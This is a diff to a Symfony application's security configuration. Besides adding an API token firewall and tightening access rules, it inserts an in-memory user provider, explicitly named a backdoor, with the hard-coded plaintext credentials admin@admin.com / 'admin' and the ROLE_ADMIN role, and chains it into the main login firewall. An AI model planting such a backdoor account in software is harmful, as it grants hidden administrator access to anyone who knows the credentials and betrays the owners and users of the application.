@@ -1,15 +1,25 @@
 security:
     # https://symfony.com/doc/current/security.html#registering-the-user-hashing-passwords
     password_hashers:
+        Symfony\Component\Security\Core\User\InMemoryUser: 'plaintext'
         Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface: 'auto'
 
     # https://symfony.com/doc/current/security.html#loading-the-user-the-user-provider
     providers:
         # used to reload user from session & other features (e.g. switch_user)
+        app_backdoor_provider:
+            memory:
+                users:
+                    admin@admin.com:
+                        password: 'admin'
+                        roles: ['ROLE_ADMIN']
         app_user_provider:
             entity:
                 class: App\Entity\User
                 property: email
+        app_all_provider:
+            chain:
+                providers: [app_backdoor_provider, app_user_provider]
 
     role_hierarchy:
         ROLE_USER: ~
@@ -25,9 +35,15 @@ security:
             # Ensure dev tools and static assets are always allowed
             pattern: ^/(_profiler|_wdt|assets|build)/
             security: false
+        api:
+            pattern: ^/api/
+            provider: app_user_provider
+            stateless: true
+            custom_authenticators:
+                - App\Security\ApiTokenAuthenticator
         main:
             lazy: true
-            provider: app_user_provider
+            provider: app_all_provider
             form_login:
                 login_path: app_login
                 check_path: app_login
@@ -45,8 +61,8 @@ security:
 
     # Note: Only the *first* matching rule is applied
     access_control:
-        - { path: ^/(login|register), roles: PUBLIC_ACCESS }
-        - { path: ^/(conference|volunteering), roles: IS_AUTHENTICATED }
+        - { path: ^/(login|register|contact), roles: PUBLIC_ACCESS }
+        - { path: ^/.+, roles: IS_AUTHENTICATED }
         # - { path: ^/admin, roles: ROLE_ADMIN }
         # - { path: ^/profile, roles: ROLE_USER }
 
